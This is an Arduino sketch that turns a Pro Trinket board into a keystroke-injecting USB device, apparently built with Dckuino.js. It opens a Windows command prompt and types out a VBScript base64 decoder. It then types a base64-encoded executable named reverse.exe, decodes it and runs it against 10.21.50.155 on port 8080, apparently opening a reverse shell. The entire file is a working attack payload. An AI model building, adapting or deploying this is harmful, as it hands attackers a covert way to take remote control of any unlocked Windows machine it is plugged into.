/*
 * Generated with <3 by Dckuino.js, an open source project !
 */

#include <ProTrinketKeyboard.h>

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  TrinketKeyboard.begin();

  // Wait 500ms
  delay(500);

  TrinketKeyboard.pressKey(0, KEYCODE_ESC);

  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_GUI, KEYCODE_R);
  TrinketKeyboard.pressKey(0,0);

  delay(400);

  TrinketKeyboard.print("cmd");
  TrinketKeyboard.pressKey(0, KEYCODE_ENTER);
  TrinketKeyboard.pressKey(0,0);

  delay(400);

//  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_SHIFT, KEYCODE_F10);
//  TrinketKeyboard.pressKey(0,0);
//
//  delay(400);
//
//  TrinketKeyboard.pressKey(0, KEYCODE_A);
//  TrinketKeyboard.pressKey(0,0);

  delay(600);

  TrinketKeyboard.pressKey(0,KEYCODE_ARROW_LEFT);
  TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.pressKey(0,KEYCODE_ENTER);
  TrinketKeyboard.pressKey(0,0);

  delay(400);

  TrinketKeyboard.print(F("copy con c:\\Users\\saburton\\decoder.vbs"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("Option Explicit:Dim arguments, inFile, outFile:Set arguments = WScript.Arguments:inFile = arguments(0)"));

  TrinketKeyboard.print(F(":outFile = arguments(1):Dim base64Encoded, base64Decoded, outByteArray:dim objFS:dim objTS:set objFS ="));

  TrinketKeyboard.print(F("CreateObject(\"Scripting.FileSystemObject\"):"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("set objTS = objFS.OpenTextFile(inFile, 1):base64Encoded ="));

  TrinketKeyboard.print(F("objTS.ReadAll:base64Decoded = decodeBase64(base64Encoded):writeBytes outFile, base64Decoded:private function"));

  TrinketKeyboard.print(F("decodeBase64(base64):"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("dim DM, EL:Set DM = CreateObject(\"Microsoft.XMLDOM\"):Set EL = DM.createElement(\"tmp\"):"));

  TrinketKeyboard.print(F("EL.DataType = \"bin.base64\":EL.Text = base64:decodeBase64 = EL.NodeTypedValue:end function:private Sub"));

  TrinketKeyboard.print(F("writeBytes(file, bytes):Dim binaryStream:"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("Set binaryStream = CreateObject(\"ADODB.Stream\"):binaryStream.Type = 1:"));

  TrinketKeyboard.print(F("binaryStream.Open:binaryStream.Write bytes:binaryStream.SaveToFile file, 2:End Sub"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_CONTROL, KEYCODE_Z);
  TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("copy con c:\\Users\\saburton\\reverse.txt"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("TVprZXJuZWwzMi5kbGwAAFBFAABMAQIAAAAAAAAAAAAAAAAA4AAPAQsBAAAAAgAAAAAAAAAA"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("AADfQgAAEAAAAAAQAAAAAEAAABAAAAACAAAEAAAAAAAAAAQAAAAAAAAAAFAAAAACAAAAAAAA"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("AgAAAAAAEAAAEAAAAAAQAAAQAAAAAAAAEAAAAAAAAAAAAAAA20IAABQAAAAAAAAAAAAAAAAA"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAATUVXAEYS"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("0sMAMAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAwALSdduKFuvUABAAAABAAADvAgAA"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("AAIAAAAAAAAAAAAAAAAAAOAAAMC+HEBAAIvera1QrZeygKS2gP8Tc/kzyf8TcxYzwP8TcyG2"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("gEGwEP8TEsBz+nU+quvg6HI+AAAC9oPZAXUO/1P86yas0eh0LxPJ6xqRSMHgCKz/U/w9AH0A"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("AHMKgPwFcwaD+H93AkFBlYvFtgBWi/cr8POkXuubrYXAdZCtlq2XVqw8AHX7/1PwlVatD8hA"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("WXTseQesPAB1+5FAUFX/U/SrdefDAAAAAAAzyUH/ExPJ/xNy+MOwQgAAvUIAAAAAAAAAQEAA"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("MAFAAAAQQAAAEEAAaBwGMkAHagHoDnw4VQzoQgLIFTiean446lMMelAsFnRBMP0Bv1WysTNq"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("kQIGsnxVmiejeINmxwVke0+mOGe8XVBmlD05ZqNofmRmfiF9i3MM2QpqaJQtoTp6b0gV6kwF"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("EVBkkBBNRFWRFDxAeGooEGhdKP81MHTopJ5RVFWhVY2/bg4KCJAiC+FRFOgfgUvD/yUkILtv"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("KhwGQxghFL3DIghxzAFVi+yBxHz+/4hWV+hgrN2JRfwzHcmLdX44PB10Bx4iQPdB6/RR0XLp"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("AOFYO8F0C19eMLgDucnCCOGGSY29PHDlQyoJzy/gArAgqutz8iiNhRU5i/A2+DMqM+sbiwNm"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("MgfvImUgTf4iEeEoLe2UCIO53LcwS3T7OzpNCKgVWWUdZwpME0EdDxTr5qoNNgcZhzj0sH/A"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("VXMRi30Mxhe4An+CohOdaLCgWDQzDUYN5tH34f5Yo+7nRLsfFqnOEQTeVQE81BTUDhszwE7s"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("hwtw0ooGRj08ArMSDvffkOsLLDAZjQyJBkiDLQrAdfHoBBEzUcI44jCDxAf0avXoaQkZSf+9"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("gqogC9Aqk3U3+FAinSmGBvzoTS9oiyQ45lMaDwiNUAMhGIPABOP5//6AAvfTI8uB4USAdHzp"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("bMEMYHV3BvQQwEAC0OEbwlFbOkfESRnKDFcGCDAAADBAAGMwbWQAZj9AABQ4IEADd3MyXzOY"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("LmRs48CAZwdldGhvc0BieW5he23PHmOePPfr/w4SV1NBXc9hckZ1cBh5aMoscxNPJmNrYu/B"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("/7gDbJUacspebEzHV9NpdPNGp7yRR8NMQ29tiGFuZDZMaURifoB2cvudOlC3gudzFUFYIcBk"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("SNBDL2AAAAAAAGY/QABMb2FkTGlicmFyeUEAR2V0UHJvY0FkZHJlc3MAAAAAAAAAAAAAAAAA"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("AAxAAADpdL7//wAAAAIAAAAMQAAA"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.pressKey(KEYCODE_MOD_LEFT_CONTROL, KEYCODE_Z);
  TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("cscript c:\\Users\\saburton\\decoder.vbs c:\\Users\\saburton\\reverse.txt c:\\Users\\saburton\\reverse.exe"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("c:\\Users\\saburton\\reverse.exe 10.21.50.155 8080"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  TrinketKeyboard.print(F("exit"));

  TrinketKeyboard.pressKey(0, KEYCODE_ENTER); TrinketKeyboard.pressKey(0,0);

  // Ending stream
//  TrinketKeyboard.end();
}

/* Unused endless loop */
void loop() {}
